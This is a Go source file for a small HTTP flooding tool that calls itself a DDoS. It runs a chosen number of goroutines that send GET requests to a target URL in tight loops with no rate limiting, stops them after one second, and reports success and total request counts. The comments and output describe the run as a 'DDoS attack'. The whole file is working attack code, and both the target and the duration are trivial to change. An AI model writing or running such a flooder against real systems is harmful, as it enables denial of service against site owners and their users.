package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"sync/atomic"
	"time"
)

// go run main.go http://127.0.0.1:80 10

/*
each worker goroutine runs an infinite loop,
sending HTTP GET requests as fast as possible
until stopped.
- Run() method starts N workers (e.g. 10),
and each worker repeatedly sends requests without
any delay or rate limiting
- loop only stops when Stop() is called,
by default after 1 second
*/

type DDoS struct {
	url             string
	stop            *chan bool
	numberOfWorkers int
	successRequest  int64
	amountRequests  int64
}

func main() {
	var URL string
	var workers int

	if len(os.Args) < 3 {
		fmt.Println("Missing parameters. Did you provide URL and number of workers?")
		os.Exit(1)
	} else {
		URL = os.Args[1]
		workers, _ = strconv.Atoi((os.Args[2])) // number of workers
	}

	d, err := New(URL, workers)
	if err != nil {
		log.Fatalf("ddos package error: %v", err)
	}
	d.Run()
	time.Sleep(time.Second) // duration of DDoS attack (default 1s)
	d.Stop()
	fmt.Printf("DDoS target server: %s\n", URL)
	fmt.Printf("DDos results. successRequest: %d / amountRequests: %d\n", d.Result()[0], d.Result()[1])
}

func New(URL string, numberOfWorkers int) (*DDoS, error) {
	if numberOfWorkers < 1 {
		return nil, fmt.Errorf("Amount of workers less than 1")
	}
	u, err := url.Parse(URL)
	if err != nil || len(u.Host) == 0 {
		return nil, fmt.Errorf("Undefined host or error = %v", err)
	}
	s := make(chan bool)
	return &DDoS{
		url:             URL,
		stop:            &s,
		numberOfWorkers: numberOfWorkers,
	}, nil
}

func (d *DDoS) Run() {
	for i := 0; i < d.numberOfWorkers; i++ {
		go func() {
			for {
				select {
				case <-(*d.stop):
					return
				default:
					// sent http GET requests
					resp, err := http.Get(d.url)
					atomic.AddInt64(&d.amountRequests, 1)
					if err == nil {
						atomic.AddInt64(&d.successRequest, 1)
						_, _ = io.Copy(io.Discard, resp.Body)
						_ = resp.Body.Close()
					}
				}
			}
		}()
	}
}

func (d *DDoS) Stop() {
	for i := 0; i < d.numberOfWorkers; i++ {
		(*d.stop) <- true
	}
	close(*d.stop)
}

func (d DDoS) Result() (reqResults []int64) {
	reqResults = []int64{d.successRequest, d.amountRequests}
	return reqResults
}
